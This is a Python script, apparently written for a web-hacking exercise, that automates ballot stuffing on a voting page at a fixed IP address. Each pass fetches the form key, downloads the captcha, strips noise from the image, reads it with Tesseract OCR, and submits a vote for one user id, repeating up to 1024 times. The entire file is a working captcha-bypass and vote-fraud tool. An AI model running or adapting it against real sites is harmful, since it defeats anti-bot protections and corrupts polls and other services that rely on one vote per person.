#!/usr/bin/python3
from bs4 import BeautifulSoup
import requests
import sys
from PIL import Image
import urllib
from operator import itemgetter
import pytesseract as tess


success_votes = 0
error_cases = 0
user_id = 3014
number_print = 1024
url = "http://158.69.76.135/level5.php"
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
     AppleWebKit/537.36 (KHTML, like Gecko)\
     Chrome/91.0.4501.0 Safari/537.36 Edg/91.0.866.0',
    'Referer': url
}
cookies_page = requests.session()
cookies_page.headers.update(header)
flag = 0


def decoding_the_captcha(captcha, l1=7):
    """Method to clean black dots and set to 808080"""
    im = Image.open(captcha)
    im = im.convert("RGB")
    p1 = im.load()

    # Filtering the black dots
    for x in range(im.size[0]):
        for y in range(im.size[1]):
            if (p1[x, y][0] < l1) and (p1[x, y][1] < l1) \
             and (p1[x, y][2] < l1):
                p1[x, y] = (0x80, 0x80, 0x80, 255)

    im.save("output.png")
    im.close()

for i in range(0, number_print):
    r = cookies_page.get(url)
    soup = BeautifulSoup(r.text, "lxml")
    key_value = soup.find('form').find('input', {'name': 'key'})['value']

    captcha_url = "http://158.69.76.135/tim.php"
    captcha_image = cookies_page.get(captcha_url)
    file = open("captcha_image.png", "wb")
    file.write(cookies_page.get(captcha_url).content)
    file.close()

    decoding_the_captcha("captcha_image.png")

    captcha_text = tess.image_to_string("output.png")[:8]
    print("captcha = '{}'".format(captcha_text))
    flag = 0
    for n in captcha_text:
        if n == " " or n == "\n" or n == "\t":
            print("fail captcha reading'{}'".format(captcha_text))
            flag = 1

    # if reading captcha is success: flag is equal to 0
    if flag == 0:
        print("Hacking captcha in progress '{}'".format(captcha_text))
        votation = {'id': user_id, 'holdthedoor': 'Submit',
                    'key': key_value, 'captcha': captcha_text}
        vote = cookies_page.post(url, data=votation)

        if vote.status_code == 200:
            success_votes += 1
            print("Success: ", success_votes)
            print("Total success cases until now: {}".format(i))
        else:
            error_cases += 1
            success_votes -= 1
            i -= 1
    else:
        i -= 1

print("-------------------")
print("print success: {}".format(success_votes))
print("error_cases: {}".format(error_cases), file=sys.stderr)
print("-------------------")
if error_cases == 0:
    print("Success operation: 100% of {} votes".format(success_votes))
